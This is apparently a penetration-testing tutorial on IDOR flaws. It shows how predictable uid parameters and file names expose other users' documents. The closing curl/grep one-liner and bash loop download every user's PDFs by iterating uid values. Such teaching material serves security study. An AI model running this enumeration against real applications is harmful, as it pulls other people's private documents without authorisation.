# Mass IDOR Enumeration
***
### Insecure Parameters
#### For instance a web application that identifies a logged-in user with the user id (object reference) `uid=1337`. Furthermore, it also implements a document storage that we can access through `/documents.php?uid=1337` and it sets the document names to a predictable naming pattern:
```html
/documents/Invoice_1_01_2024.pdf
/documents/Report_1_01_2024.pdf
```
#### When we find out that a file follows a naming patter, we may try and fuzz files for other users. These type of IDOR vulnerability is called **static file IDOR**.

#### Also by relying on the userid in the URL (`documents.php?uid=1337`) as a direct reference to that user records , we may be able to view other users' documents by simply changing the uid value. When a web application has a poor design , like the above one as it passes our **uid** in clear text as a direct reference, we could access the other users' records.

### Mass Enumeration
#### We can try manually accessing other user documents by changing the uid like (`uid=3, uid=4`) but this is not an efficient way to perform a enumeration in real work environments with hundreds or thousands of users. SO we may use tools such as **Burp Intruder** , **ZAP Fuzzer** or **FFUF** to retrieve all data or simply write a bash script to download all files.

#### Example of HTML source code to see how files may be stored:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_1_01_2024.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_1_01_2024.pdf' target='_blank'>Report</a></li>
```

#### We may use **curl** to get the HTML code and **grep** with **regex** to only get the line containing the path to each file:
```shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

#### Then we can build our bash script to get all files of each registered user
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..1337}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

